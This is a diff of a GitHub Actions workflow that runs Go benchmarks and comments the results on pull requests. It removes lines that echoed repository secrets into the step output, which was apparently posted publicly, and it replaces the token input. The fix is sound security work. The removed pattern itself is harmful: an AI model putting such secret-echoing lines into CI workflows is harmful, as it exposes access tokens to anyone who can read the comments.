@@ -13,10 +13,6 @@ on:
         description: Sha of the github commit to check out
         required: true
         type: string
-    secrets:
-      github-access-token:
-        description: token for writing to github PRs
-        required: true
 jobs:
   run-test:
     runs-on: ubuntu-latest
@@ -34,8 +30,6 @@ jobs:
             go test -tags=test_performance -run=1 -bench=. -count=1 -cpuprofile output/cpu.out -memprofile output/mem.out > output/results.txt
             echo 'OUTPUT<<EOF'
             cat output/results.txt
-            echo "${{ secrets.github-access-token }}"
-            echo "${{ secrets.actions_runner_debug }}"
             echo EOF
           } >> "$GITHUB_OUTPUT"
       - uses: actions/upload-artifact@v4
@@ -48,7 +42,7 @@ jobs:
           RESULTS: ${{ steps.test-run.outputs.OUTPUT }}
           UPLOAD: ${{ steps.artifact-upload.outputs.artifact-url }}
         with:
-          github-token: ${{ secrets.github-access-token }}
+          github-token: ${{ secrets.github-token }}
           script: |
               github.rest.issues.createComment({
                 issue_number: context.issue.number,
